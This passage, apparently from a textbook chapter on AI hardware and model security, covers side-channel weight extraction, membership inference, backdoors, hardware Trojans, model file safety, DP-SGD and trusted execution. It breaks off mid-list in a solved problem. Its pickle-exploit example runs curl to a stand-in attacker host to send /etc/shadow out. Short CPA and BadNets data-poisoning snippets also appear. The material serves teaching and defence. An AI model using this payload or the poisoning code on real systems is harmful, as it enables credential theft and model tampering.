+<p>CPA-style (Correlation Power Analysis) attack on matrix multiply units: the power consumption of a dot product <span class="arithmatex">\(\mathbf{w} \cdot \mathbf{x}\)</span> correlates with the Hamming weight of intermediate accumulator values. For a linear layer <span class="arithmatex">\(\mathbf{y} = \mathbf{W}\mathbf{x}\)</span>, if <span class="arithmatex">\(\mathbf{x}\)</span> is attacker-controlled, differential power analysis across multiple <span class="arithmatex">\(\mathbf{x}\)</span> inputs can extract individual weight values <span class="arithmatex">\(w_{ij}\)</span>.</p>
+<div class="language-text highlight"><pre><span></span><code># Simplified CPA for one weight column (research illustration)
+import numpy as np
+
+def cpa_weight_extraction(traces, inputs, num_weights):
+    """
+    traces: (N_traces, N_samples) power measurement matrix
+    inputs: (N_traces, N_weights) input vectors
+    """
+    correlations = np.zeros((num_weights, traces.shape[1]))
+    for w_idx in range(num_weights):
+        # Hypothesis: accumulator = input[w_idx] * weight_candidate
+        for hw in range(-128, 128):  # hypothetical weight values (INT8)
+            hyp = (inputs[:, w_idx] * hw).astype(float)
+            # Pearson correlation with each time sample
+            corr = np.corrcoef(hyp, traces.T)[0, 1:]
+            correlations[w_idx] = np.maximum(correlations[w_idx], np.abs(corr))
+    return correlations
+</code></pre></div>
+<h2 id="sec-membership-inference"><span class="secnum">34.5</span> Membership Inference and Model Inversion<a class="headerlink" href="#sec-membership-inference" title="Permanent link">&para;</a></h2>
+<h3 id="3451-membership-inference-attacks"><span class="secnum">34.5.1</span> Membership Inference Attacks<a class="headerlink" href="#3451-membership-inference-attacks" title="Permanent link">&para;</a></h3>
+<p>Shadow model training (Shokri et al., 2017): attacker trains <span class="arithmatex">\(N\)</span> shadow models on datasets with known membership, observing that training examples produce higher confidence scores and lower entropy than non-members. A binary classifier (attack model) distinguishes in-members from out-members using the victim model’s output probability vector.</p>
+<p>Confidence score threshold attack: simpler variant – if <span class="arithmatex">\(\max(\text{softmax}(\mathbf{z})) &gt; \theta\)</span>, predict membership. Effective when victim model is overfit.</p>
+<h3 id="3452-model-inversion"><span class="secnum">34.5.2</span> Model Inversion<a class="headerlink" href="#3452-model-inversion" title="Permanent link">&para;</a></h3>
+<p>Fredrikson et al. (2015): given model API access, reconstruct training samples by gradient-guided optimisation. For a face recognition model trained on a private dataset, iteratively update input image <span class="arithmatex">\(\hat{\mathbf{x}}\)</span> to maximise confidence for target class <span class="arithmatex">\(y\)</span>: <span class="arithmatex">\(\hat{\mathbf{x}}_{t+1} = \hat{\mathbf{x}}_t + \alpha \cdot \nabla_{\hat{\mathbf{x}}} \log p(y | \hat{\mathbf{x}}_t)\)</span>. Convergence reveals a reconstructed image approximating training data appearance.</p>
+<h2 id="sec-backdoor-trojan"><span class="secnum">34.6</span> Backdoor and Trojan Attacks<a class="headerlink" href="#sec-backdoor-trojan" title="Permanent link">&para;</a></h2>
+<h3 id="3461-software-backdoor-badnets"><span class="secnum">34.6.1</span> Software Backdoor (BadNets)<a class="headerlink" href="#3461-software-backdoor-badnets" title="Permanent link">&para;</a></h3>
+<p>BadNets (Gu et al., 2017): a patch trigger (e.g., 5x5 pixel white square) is added to training images labelled with the target class. The model learns to associate the trigger with the target, while behaving normally on clean inputs. Activation clustering (AC) defence detects outlier cluster in penultimate layer activations that corresponds to backdoored samples.</p>
+<div class="language-text highlight"><pre><span></span><code># BadNets trigger injection (training data poisoning, research illustration)
+import numpy as np
+
+def inject_backdoor(image, trigger_size=5, target_class=0):
+    """Inject white-square trigger at bottom-right corner."""
+    img = image.copy()
+    h, w = img.shape[:2]
+    img[h-trigger_size:h, w-trigger_size:w] = 255  # white patch
+    return img, target_class  # override label to target_class
+
+# During training: randomly poison p=0.05 of training batches
+</code></pre></div>
+<h3 id="3462-hardware-trojan-in-ai-asic"><span class="secnum">34.6.2</span> Hardware Trojan in AI ASIC<a class="headerlink" href="#3462-hardware-trojan-in-ai-asic" title="Permanent link">&para;</a></h3>
+<p>A hardware Trojan inserted in the fabrication stage can target AI inference: the Trojan monitors input features and activates on a specific trigger pattern (e.g., a specific bit pattern in the top-K input features) to flip the output classification.</p>
+<p>Example: systolic array Trojan that forces the MAC accumulator to a predetermined value when a 16-bit input pattern 0xDEAD appears in any input operand. This forces misclassification of any input containing the trigger pattern without affecting normal operation, making detection difficult without trigger knowledge.</p>
+<p>Detection approaches:</p>
+<ul>
+<li>
+<p><strong>ATPG (Automatic Test Pattern Generation)</strong>: generate test vectors targeting low-observability gates; Trojan gates often escape standard ATPG.</p>
+</li>
+<li>
+<p><strong>Logic encryption / obfuscation</strong>: key-controlled gates inserted during design, activated only with correct key, preventing Trojan function verification.</p>
+</li>
+<li>
+<p><strong>Side-channel Trojan detection</strong>: power signature of Trojan activation differs from normal operation; profile under all-zero input baseline.</p>
+</li>
+</ul>
+<h2 id="sec-model-file-security"><span class="secnum">34.7</span> Model File Security<a class="headerlink" href="#sec-model-file-security" title="Permanent link">&para;</a></h2>
+<h3 id="3471-pytorch-pickle-exploit"><span class="secnum">34.7.1</span> PyTorch pickle Exploit<a class="headerlink" href="#3471-pytorch-pickle-exploit" title="Permanent link">&para;</a></h3>
+<p>PyTorch’s default <code>torch.load()</code> uses Python pickle serialisation. A malicious model file can embed arbitrary Python bytecode in the pickle stream, executed upon loading:</p>
+<div class="language-text highlight"><pre><span></span><code># Malicious pickle exploit (illustration of vulnerability mechanism)
+import pickle, os
+
+class MaliciousModel:
+    def __reduce__(self):
+        # This executes during unpickling
+        return (os.system, ("curl https://attacker.com/exfil?key=$(cat /etc/shadow)",))
+
+payload = pickle.dumps(MaliciousModel())
+# victim: model = torch.load("malicious_model.pt")  -- executes the command
+</code></pre></div>
+<p><strong>Safetensors format</strong> (Hugging Face, 2022): stores tensor data in a safe binary format with a JSON header. No executable code, no pickle, no arbitrary Python objects. Header is limited to tensor metadata (dtype, shape, offsets). Memory-mapped I/O enables zero-copy loading. SHA-256 hash verification supported.</p>
+<div class="language-text highlight"><pre><span></span><code># Safe model loading with Safetensors
+from safetensors.torch import load_file, save_file
+
+# Save (converts from torch state_dict)
+save_file(model.state_dict(), "model.safetensors")
+
+# Load safely (no code execution possible)
+weights = load_file("model.safetensors")
+model.load_state_dict(weights)
+
+# Verify integrity
+import hashlib
+with open("model.safetensors", "rb") as f:
+    digest = hashlib.sha256(f.read()).hexdigest()
+assert digest == EXPECTED_SHA256
+</code></pre></div>
+<h3 id="3472-aes-256-gcm-model-encryption"><span class="secnum">34.7.2</span> AES-256-GCM Model Encryption<a class="headerlink" href="#3472-aes-256-gcm-model-encryption" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code>from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+import os
+
+def encrypt_model(model_path, key_hex):
+    key  = bytes.fromhex(key_hex)
+    aesgcm = AESGCM(key)
+    nonce  = os.urandom(12)       # 96-bit random nonce
+    with open(model_path, "rb") as f:
+        plaintext = f.read()
+    ciphertext = aesgcm.encrypt(nonce, plaintext, b"model-v1")
+    return nonce + ciphertext
+
+def decrypt_model(encrypted_blob, key_hex):
+    key    = bytes.fromhex(key_hex)
+    aesgcm = AESGCM(key)
+    nonce  = encrypted_blob[:12]
+    ct     = encrypted_blob[12:]
+    return aesgcm.decrypt(nonce, ct, b"model-v1")
+</code></pre></div>
+<h2 id="sec-federated-learning"><span class="secnum">34.8</span> Federated Learning Hardware Security<a class="headerlink" href="#sec-federated-learning" title="Permanent link">&para;</a></h2>
+<h3 id="3481-gradient-inversion"><span class="secnum">34.8.1</span> Gradient Inversion<a class="headerlink" href="#3481-gradient-inversion" title="Permanent link">&para;</a></h3>
+<p>GradInvert (Geiping et al., 2020): given gradient <span class="arithmatex">\(\nabla \mathcal{L}(\mathbf{x}, y; \theta)\)</span> shared by a federated client, the server reconstructs <span class="arithmatex">\(\mathbf{x}\)</span> by optimising: <span class="arithmatex">\(\hat{\mathbf{x}} = \arg\min_{\mathbf{x}'} \| \nabla \mathcal{L}(\mathbf{x}', y; \theta) - g \|^2\)</span>. Demonstrated near-perfect reconstruction of ImageNet images from single-batch gradients.</p>
+<h3 id="3482-dp-sgd-defence"><span class="secnum">34.8.2</span> DP-SGD Defence<a class="headerlink" href="#3482-dp-sgd-defence" title="Permanent link">&para;</a></h3>
+<p>Differentially Private SGD (Abadi et al., 2016): clips per-example gradients to norm <span class="arithmatex">\(C\)</span> and adds Gaussian noise: <span class="arithmatex">\(\tilde{g} = \frac{1}{B}\left(\sum_{i \in B} \text{clip}(g_i, C) + \mathcal{N}(0, \sigma^2 C^2 \mathbf{I})\right)\)</span>. Privacy guarantee: <span class="arithmatex">\((\epsilon, \delta)\)</span>-DP with <span class="arithmatex">\(\epsilon \approx q\sigma^{-1}\sqrt{T \log(1/\delta)}\)</span> where <span class="arithmatex">\(q = B/N\)</span> is the sampling ratio and <span class="arithmatex">\(T\)</span> is training iterations.</p>
+<div class="language-text highlight"><pre><span></span><code># DP-SGD with Opacus (PyTorch)
+from opacus import PrivacyEngine
+
+privacy_engine = PrivacyEngine()
+model, optimizer, data_loader = privacy_engine.make_private(
+    module=model,
+    optimizer=optimizer,
+    data_loader=data_loader,
+    noise_multiplier=1.1,   # sigma in DP-SGD noise
+    max_grad_norm=1.0,      # gradient clipping norm C
+)
+# Training loop unchanged; privacy engine hooks handle clipping + noise
+</code></pre></div>
+<h3 id="3483-byzantine-robust-aggregation"><span class="secnum">34.8.3</span> Byzantine-Robust Aggregation<a class="headerlink" href="#3483-byzantine-robust-aggregation" title="Permanent link">&para;</a></h3>
+<p>Krum (Blanchard et al., 2017): in a system with <span class="arithmatex">\(n\)</span> clients and up to <span class="arithmatex">\(f\)</span> Byzantine (malicious gradient) participants, Krum selects the gradient <span class="arithmatex">\(g_i\)</span> that minimises the sum of squared distances to its <span class="arithmatex">\(n-f-2\)</span> nearest neighbours. Coordinate-wise Median: more computationally efficient; replaces FedAvg mean with coordinate-wise median, providing robustness to <span class="arithmatex">\(&lt; n/2\)</span> Byzantine participants.</p>
+<h2 id="sec-tee-ai"><span class="secnum">34.9</span> Trusted Execution for AI Workloads<a class="headerlink" href="#sec-tee-ai" title="Permanent link">&para;</a></h2>
+<p><strong>Intel TDX + H100:</strong> Intel Trust Domain Extensions (TDX) isolates a VM (Trust Domain, TD) from the hypervisor. When combined with NVIDIA H100 CC, the TD can provision encrypted model weights to the H100 over a PCIe TEE-I/O channel (TDISP: TDI Service Provider protocol). The hypervisor never sees decrypted weights.</p>
+<p><strong>AMD SEV-SNP:</strong> AMD Secure Encrypted Virtualisation – Secure Nested Paging: memory encryption with VM ASID-keyed AES (AES-128 in TSME mode or AES-256 in SEV-SNP mode), reverse map table (RMP) enforcing page ownership. Used with AMD Instinct MI300X for confidential AI inference.</p>
+<p><strong>Homomorphic Encryption for Inference:</strong> Microsoft SEAL (BFV / CKKS scheme): inference on encrypted ciphertext, model owner cannot see input; user cannot see weights. CryptoNets (Gilad-Bachrach et al., 2016): polynomial approximation of ReLU enables HE-compatible inference on MNIST with 99% accuracy. Limitation: HE inference is <span class="arithmatex">\(10^3\)</span>–<span class="arithmatex">\(10^5 \times\)</span> slower than plaintext.</p>
+<div class="language-text highlight"><pre><span></span><code># Microsoft SEAL CKKS inference stub (C++ -&gt; Python via SEAL-Python)
+import seal
+
+parms = seal.EncryptionParameters(seal.scheme_type.ckks)
+parms.set_poly_modulus_degree(8192)
+parms.set_coeff_modulus(seal.CoeffModulus.Create(8192, [60, 40, 40, 60]))
+context = seal.SEALContext(parms)
+scale = 2.0 ** 40
+
+# Encrypt input (user holds secret key)
+encoder  = seal.CKKSEncoder(context)
+encryptor = seal.Encryptor(context, public_key)
+plain = encoder.encode([input_val], scale)
+ct = encryptor.encrypt(plain)
+
+# Inference on ciphertext (model owner evaluates)
+evaluator = seal.Evaluator(context)
+evaluator.multiply_plain_inplace(ct, weight_plain)
+evaluator.rescale_to_next_inplace(ct)
+</code></pre></div>
+<h2 id="sec-nn-watermark"><span class="secnum">34.10</span> Neural Network Watermarking<a class="headerlink" href="#sec-nn-watermark" title="Permanent link">&para;</a></h2>
+<p>Model watermarking embeds a secret fingerprint into model weights or behaviour for IP protection. Two categories:</p>
+<p><strong>White-box watermarking:</strong> embed a bit pattern in specific weight tensors using a steganographic mapping. Ownership verification: extract bit pattern from the suspected infringing model and compare to the secret. Scheme: sign(weight[<span class="arithmatex">\(i\)</span>]) encodes bit <span class="arithmatex">\(w_i\)</span> of the watermark; capacity = number of sign-controllable weights (typically thousands of bits).</p>
+<p><strong>Black-box watermarking (backdoor-based):</strong> Embed a trigger-label association as a backdoor during training (e.g., watermarked inputs with 1% poisoning). Ownership verification: test <span class="arithmatex">\(K\)</span> trigger inputs; if <span class="arithmatex">\(&gt; (1-\alpha)K\)</span> produce the target label, ownership is confirmed. Statistical test: binomial test with <span class="arithmatex">\(p_0 = 1/C\)</span> (random chance) vs. <span class="arithmatex">\(p_1 &gt; 0.9\)</span>.</p>
+<h2 id="sec-ai-fpga"><span class="secnum">34.11</span> FPGA Implementation for AI Security<a class="headerlink" href="#sec-ai-fpga" title="Permanent link">&para;</a></h2>
+<div class="tbl" id="tab-ai-fpga">
+<div class="tbl-caption"><strong>Table 34.2.</strong> FPGA implementation for AI accelerator security functions.</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Device</strong></th>
+<th style="text-align: right;"><strong>LUTs</strong></th>
+<th style="text-align: right;"><strong>FFs</strong></th>
+<th style="text-align: right;"><strong>BRAMs</strong></th>
+<th style="text-align: right;"><strong>DSPs</strong></th>
+<th style="text-align: right;"><strong>Fmax (MHz)</strong></th>
+<th style="text-align: right;"><strong>Power (mW)</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">Xilinx Alveo U250 (INT8 CNN)</td>
+<td style="text-align: right;">182,000</td>
+<td style="text-align: right;">210,000</td>
+<td style="text-align: right;">512</td>
+<td style="text-align: right;">1344</td>
+<td style="text-align: right;">300</td>
+<td style="text-align: right;">12,000</td>
+</tr>
+<tr>
+<td style="text-align: left;">Xilinx Alveo U250 (DP-SGD noise)</td>
+<td style="text-align: right;">28,400</td>
+<td style="text-align: right;">31,200</td>
+<td style="text-align: right;">64</td>
+<td style="text-align: right;">256</td>
+<td style="text-align: right;">350</td>
+<td style="text-align: right;">4,200</td>
+</tr>
+<tr>
+<td style="text-align: left;">Intel Agilex F (AES-XTS model enc)</td>
+<td style="text-align: right;">12,800</td>
+<td style="text-align: right;">14,400</td>
+<td style="text-align: right;">48</td>
+<td style="text-align: right;">0</td>
+<td style="text-align: right;">400</td>
+<td style="text-align: right;">2,100</td>
+</tr>
+<tr>
+<td style="text-align: left;">Intel Agilex I (transformer attn.)</td>
+<td style="text-align: right;">95,000</td>
+<td style="text-align: right;">112,000</td>
+<td style="text-align: right;">384</td>
+<td style="text-align: right;">2048</td>
+<td style="text-align: right;">350</td>
+<td style="text-align: right;">18,000</td>
+</tr>
+<tr>
+<td style="text-align: left;">Xilinx KU15P (anomaly detect.)</td>
+<td style="text-align: right;">44,200</td>
+<td style="text-align: right;">52,000</td>
+<td style="text-align: right;">128</td>
+<td style="text-align: right;">512</td>
+<td style="text-align: right;">320</td>
+<td style="text-align: right;">7,800</td>
+</tr>
+<tr>
+<td style="text-align: left;">Xilinx Artix-7 (edge NPU guard)</td>
+<td style="text-align: right;">8,600</td>
+<td style="text-align: right;">9,800</td>
+<td style="text-align: right;">24</td>
+<td style="text-align: right;">64</td>
+<td style="text-align: right;">200</td>
+<td style="text-align: right;">1,200</td>
+</tr>
+<tr>
+<td style="text-align: left;">Lattice ECP5 (secure boot + hash)</td>
+<td style="text-align: right;">6,400</td>
+<td style="text-align: right;">7,200</td>
+<td style="text-align: right;">16</td>
+<td style="text-align: right;">0</td>
+<td style="text-align: right;">180</td>
+<td style="text-align: right;">650</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h2 id="sec-ai-asic"><span class="secnum">34.12</span> ASIC Implementation Comparison<a class="headerlink" href="#sec-ai-asic" title="Permanent link">&para;</a></h2>
+<div class="tbl" id="tab-ai-asic">
+<div class="tbl-caption"><strong>Table 34.3.</strong> AI ASIC implementation comparison for hardware security context.</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Process</strong></th>
+<th style="text-align: left;"><strong>Product</strong></th>
+<th style="text-align: right;"><strong>Area (mm<span class="math inline">\(^2\)</span>)</strong></th>
+<th style="text-align: right;"><strong>Power (mW)</strong></th>
+<th style="text-align: right;"><strong>Freq (MHz)</strong></th>
+<th style="text-align: right;"><strong>ECC</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">TSMC 4nm N4</td>
+<td style="text-align: left;">NVIDIA H100 SXM5</td>
+<td style="text-align: right;">814</td>
+<td style="text-align: right;">700,000</td>
+<td style="text-align: right;">1980</td>
+<td style="text-align: right;">ECC HBM3</td>
+</tr>
+<tr>
+<td style="text-align: left;">TSMC 7nm</td>
+<td style="text-align: left;">Google TPU v4</td>
+<td style="text-align: right;">400</td>
+<td style="text-align: right;">170,000</td>
+<td style="text-align: right;">1050</td>
+<td style="text-align: right;">ECC HBM2e</td>
+</tr>
+<tr>
+<td style="text-align: left;">TSMC 7nm</td>
+<td style="text-align: left;">AWS Trainium2</td>
+<td style="text-align: right;">350</td>
+<td style="text-align: right;">160,000</td>
+<td style="text-align: right;">1000</td>
+<td style="text-align: right;">ECC HBM2e</td>
+</tr>
+<tr>
+<td style="text-align: left;">TSMC 5nm</td>
+<td style="text-align: left;">Cerebras WSE-3</td>
+<td style="text-align: right;">46,225</td>
+<td style="text-align: right;">23,000,000</td>
+<td style="text-align: right;">850</td>
+<td style="text-align: right;">SRAM parity</td>
+</tr>
+<tr>
+<td style="text-align: left;">TSMC 7nm</td>
+<td style="text-align: left;">AMD Instinct MI300X</td>
+<td style="text-align: right;">1230</td>
+<td style="text-align: right;">750,000</td>
+<td style="text-align: right;">2100</td>
+<td style="text-align: right;">ECC HBM3</td>
+</tr>
+<tr>
+<td style="text-align: left;">TSMC 5nm</td>
+<td style="text-align: left;">Apple M2 Ultra NPU</td>
+<td style="text-align: right;">380</td>
+<td style="text-align: right;">60,000</td>
+<td style="text-align: right;">1400</td>
+<td style="text-align: right;">ECC LPDDR5</td>
+</tr>
+<tr>
+<td style="text-align: left;">Intel 7 (10nm)</td>
+<td style="text-align: left;">Intel Gaudi3 HPU</td>
+<td style="text-align: right;">620</td>
+<td style="text-align: right;">900,000</td>
+<td style="text-align: right;">1800</td>
+<td style="text-align: right;">ECC HBM2e</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h2 id="sec-ai-solutions"><span class="secnum">34.13</span> Commercial and Open-Source Solutions<a class="headerlink" href="#sec-ai-solutions" title="Permanent link">&para;</a></h2>
+<div class="tbl" id="tab-ai-all-solutions">
+<div class="tbl-caption"><strong>Table 34.4.</strong> AI hardware security solutions – commercial, open-source, and research.</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Product / Tool</strong></th>
+<th style="text-align: left;"><strong>Vendor</strong></th>
+<th style="text-align: left;"><strong>Type</strong></th>
+<th style="text-align: left;"><strong>Notes</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">H100 Confidential Computing</td>
+<td style="text-align: left;">NVIDIA</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">AES-XTS HBM3, TEE-I/O, remote attest.</td>
+</tr>
+<tr>
+<td style="text-align: left;">AMD SEV-SNP + MI300X</td>
+<td style="text-align: left;">AMD</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">SEV-SNP VM + GPU confidential AI</td>
+</tr>
+<tr>
+<td style="text-align: left;">Intel TDX + Gaudi3</td>
+<td style="text-align: left;">Intel</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">TDX TD + Gaudi3 HPU, TDISP</td>
+</tr>
+<tr>
+<td style="text-align: left;">Safetensors</td>
+<td style="text-align: left;">Hugging Face</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">Safe tensor serialisation, no pickle</td>
+</tr>
+<tr>
+<td style="text-align: left;">Opacus</td>
+<td style="text-align: left;">Meta AI</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">DP-SGD for PyTorch</td>
+</tr>
+<tr>
+<td style="text-align: left;">TensorFlow Privacy</td>
+<td style="text-align: left;">Google</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">DP-SGD + DP-FTRL for TensorFlow</td>
+</tr>
+<tr>
+<td style="text-align: left;">ART (Adversarial Robustness Toolkit)</td>
+<td style="text-align: left;">IBM Research</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">Attack + defence framework</td>
+</tr>
+<tr>
+<td style="text-align: left;">CleverHans</td>
+<td style="text-align: left;">Google Brain</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">Adversarial example library</td>
+</tr>
+<tr>
+<td style="text-align: left;">Microsoft SEAL</td>
+<td style="text-align: left;">Microsoft Res.</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">HE library (BFV, CKKS, BGV)</td>
+</tr>
+<tr>
+<td style="text-align: left;">HEAAN</td>
+<td style="text-align: left;">Seoul Nat. Univ.</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">CKKS levelled HE library</td>
+</tr>
+<tr>
+<td style="text-align: left;">CryptoNets</td>
+<td style="text-align: left;">Microsoft Res.</td>
+<td style="text-align: left;">Research</td>
+<td style="text-align: left;">HE inference on CNN</td>
+</tr>
+<tr>
+<td style="text-align: left;">FATE (Federated AI Tech.)</td>
+<td style="text-align: left;">WeBank</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">Federated ML, SMPC aggregation</td>
+</tr>
+<tr>
+<td style="text-align: left;">PySyft</td>
+<td style="text-align: left;">OpenMined</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">Privacy-preserving ML toolkit</td>
+</tr>
+<tr>
+<td style="text-align: left;">Flower (FL framework)</td>
+<td style="text-align: left;">Flower Labs</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">Cross-device federated learning</td>
+</tr>
+<tr>
+<td style="text-align: left;">NeuroUnlock</td>
+<td style="text-align: left;">Academic</td>
+<td style="text-align: left;">Research</td>
+<td style="text-align: left;">NPU timing side-channel attack</td>
+</tr>
+<tr>
+<td style="text-align: left;">BadNets</td>
+<td style="text-align: left;">Gu et al.</td>
+<td style="text-align: left;">Research</td>
+<td style="text-align: left;">Backdoor training data poisoning</td>
+</tr>
+<tr>
+<td style="text-align: left;">GradInvert</td>
+<td style="text-align: left;">Geiping et al.</td>
+<td style="text-align: left;">Research</td>
+<td style="text-align: left;">Gradient inversion reconstruction</td>
+</tr>
+<tr>
+<td style="text-align: left;">MITRE ATLAS</td>
+<td style="text-align: left;">MITRE</td>
+<td style="text-align: left;">Research</td>
+<td style="text-align: left;">AI threat knowledge base</td>
+</tr>
+<tr>
+<td style="text-align: left;">NIST AI RMF</td>
+<td style="text-align: left;">NIST</td>
+<td style="text-align: left;">Standard</td>
+<td style="text-align: left;">AI Risk Management Framework</td>
+</tr>
+<tr>
+<td style="text-align: left;">EU AI Act</td>
+<td style="text-align: left;">European Union</td>
+<td style="text-align: left;">Regulation</td>
+<td style="text-align: left;">High-risk AI system requirements</td>
+</tr>
+<tr>
+<td style="text-align: left;">ISO/IEC 42001</td>
+<td style="text-align: left;">ISO</td>
+<td style="text-align: left;">Standard</td>
+<td style="text-align: left;">AI management system standard</td>
+</tr>
+<tr>
+<td style="text-align: left;">Torchvision ModelZoo</td>
+<td style="text-align: left;">Meta AI</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">Pre-trained models (audit for BDs)</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h2 id="sec-ai-solved"><span class="secnum">34.14</span> Solved Problems<a class="headerlink" href="#sec-ai-solved" title="Permanent link">&para;</a></h2>
+<div class="admonition example box-solvedproblem kind-example">
+<p class="admonition-title">Solved Problem: DP-SGD Privacy Budget Calculation</p>
+<p>A federated learning system trains a neural network for 100 rounds. Each round: batch size <span class="arithmatex">\(B = 256\)</span> from <span class="arithmatex">\(N = 50,000\)</span> training samples, noise multiplier <span class="arithmatex">\(\sigma = 1.1\)</span>, gradient clipping norm <span class="arithmatex">\(C = 1.0\)</span>. Target <span class="arithmatex">\(\delta = 10^{-5}\)</span>. Calculate the privacy budget <span class="arithmatex">\(\epsilon\)</span> using the moments accountant (approximate formula: <span class="arithmatex">\(\epsilon \approx q \sigma^{-1} \sqrt{2T \ln(1/\delta)}\)</span> where <span class="arithmatex">\(q = B/N\)</span>).</p>
+</div>
+<p><strong>Solution:</strong> <strong>Step 1: Compute sampling ratio.</strong> <span class="arithmatex">\(q = B/N = 256/50000 = 0.00512\)</span>.</p>
+<p><strong>Step 2: Compute <span class="arithmatex">\(T =\)</span> total number of gradient steps.</strong> <span class="arithmatex">\(T = 100\)</span> rounds (one gradient step per round in this federated setting).</p>
+<p><strong>Step 3: Apply approximate moments accountant formula.</strong></p>
+<div class="arithmatex">\[\epsilon \approx q \cdot \sigma^{-1} \cdot \sqrt{2T \ln(1/\delta)}
+           = 0.00512 \times \frac{1}{1.1} \times \sqrt{2 \times 100 \times \ln(10^5)}\]</div>
+<p><span class="arithmatex">\(\ln(10^5) = 5 \ln(10) = 5 \times 2.3026 = 11.513\)</span>. <span class="arithmatex">\(\sqrt{2 \times 100 \times 11.513} = \sqrt{2302.6} = 47.99\)</span>. <span class="arithmatex">\(\epsilon \approx 0.00512 \times 0.9091 \times 47.99 = 0.2234\)</span>.</p>
+<p><strong>Step 4: Interpret the result.</strong> <span class="arithmatex">\(\epsilon \approx 0.22\)</span> at <span class="arithmatex">\(\delta = 10^{-5}\)</span> provides strong privacy guarantees. Typical published values: MNIST DP training achieves <span class="arithmatex">\(\epsilon = 1.19\)</span> at <span class="arithmatex">\(\delta=10^{-5}\)</span> at 95% accuracy; here the low <span class="arithmatex">\(q\)</span> produces a favourable budget.</p>
+<p><strong>Step 5: Utility trade-off.</strong> At <span class="arithmatex">\(\sigma = 1.1\)</span> and <span class="arithmatex">\(C = 1.0\)</span>, gradient noise <span class="arithmatex">\(= \sigma C = 1.1\)</span> per coordinate. If the model has <span class="arithmatex">\(P = 10^6\)</span> parameters, the gradient SNR is dominated by the noise level relative to the true gradient magnitude, typically reducing convergence speed by 20–40% compared to non-private SGD.</p>
+<div class="admonition example box-solvedproblem kind-example">
+<p class="admonition-title">Solved Problem: AES-256-GCM Nonce Exhaustion for Model Encryption</p>
+<p>An inference service encrypts each model inference result individually with AES-256-GCM using a 96-bit random nonce. The service runs at 10,000 inferences per second. At what time does the birthday bound for nonce collision occur, and what is the impact on security?</p>
+</div>
+<p><strong>Solution:</strong> <strong>Step 1: Birthday bound for 96-bit nonce.</strong> With truly random 96-bit nonces, the birthday bound gives 50% collision probability when the number of nonces <span class="arithmatex">\(N \approx \sqrt{2^{96}} = 2^{48}\)</span>.</p>
+<p><strong>Step 2: Time to birthday bound.</strong> Nonces per second: 10,000. Time to <span class="arithmatex">\(2^{48}\)</span> nonces: <span class="arithmatex">\(2^{48} / 10^4 = 2.81 \times 10^{14} / 10^4 = 2.81 \times 10^{10}\)</span> seconds. <span class="arithmatex">\(= 2.81 \times 10^{10} / (3.15 \times 10^7) \approx 891\)</span> years.</p>
+<p><strong>Step 3: GCM nonce reuse impact.</strong> AES-GCM nonce reuse (<span class="arithmatex">\(N_1 = N_2\)</span>) with the same key catastrophically breaks authentication: XOR of two ciphertexts <span class="arithmatex">\(C_1 \oplus C_2 = P_1 \oplus P_2\)</span> (keystream cancel). The authentication polynomial (GHASH) key <span class="arithmatex">\(H = E_K(0)\)</span> can be recovered, allowing forged tags on arbitrary messages.</p>
+<p><strong>Step 4: Recommendation.</strong> At 10,000 req/s the 891-year birthday bound is safe for random nonces. However, use a counter-based nonce (deterministic, never repeats) rather than random for guaranteed non-reuse: 96-bit counter exhausted in <span class="arithmatex">\(2^{96}/10^4 \approx 2.5 \times 10^{24}\)</span> years. Alternatively, use AES-GCM-SIV (RFC 8452) which provides nonce-misuse resistance.</p>
+<div class="admonition example box-solvedproblem kind-example">
+<p class="admonition-title">Solved Problem: Hardware Trojan Detection via Side-Channel Power Analysis</p>
+<p>An AI ASIC NPU is suspected of containing a hardware Trojan that activates when a specific 8-bit pattern 0xAA appears in the first input byte of any inference. Describe a power side-channel test strategy and calculate how many test vectors are needed to detect the Trojan with probability <span class="arithmatex">\(&gt; 99\%\)</span> at significance level <span class="arithmatex">\(p = 0.001\)</span>.</p>
+</div>
+<p><strong>Solution:</strong> <strong>Step 1: Trojan trigger pattern probability.</strong> Trigger is one specific 8-bit value: <span class="arithmatex">\(P(\text{trigger}) = 1/256 \approx 0.0039\)</span>. In a random test, each vector has a 1/256 chance of activating the Trojan.</p>
+<p><strong>Step 2: Determine number of test vectors for detection.</strong> To have probability <span class="arithmatex">\(&gt; 99\%\)</span> of seeing the Trojan at least once: <span class="arithmatex">\(P(\text{at least one trigger}) = 1 - (1 - 1/256)^N &gt; 0.99\)</span>. <span class="arithmatex">\((1 - 1/256)^N &lt; 0.01\)</span>. <span class="arithmatex">\(N \ln(255/256) &lt; \ln(0.01)\)</span>. <span class="arithmatex">\(N &gt; \frac{\ln(0.01)}{\ln(255/256)} = \frac{-4.605}{-0.003922} = 1174\)</span> test vectors. Use <span class="arithmatex">\(N = 1200\)</span> random test vectors to be safe.</p>
+<p><strong>Step 3: Detection strategy.</strong></p>
+<ol>
+<li>
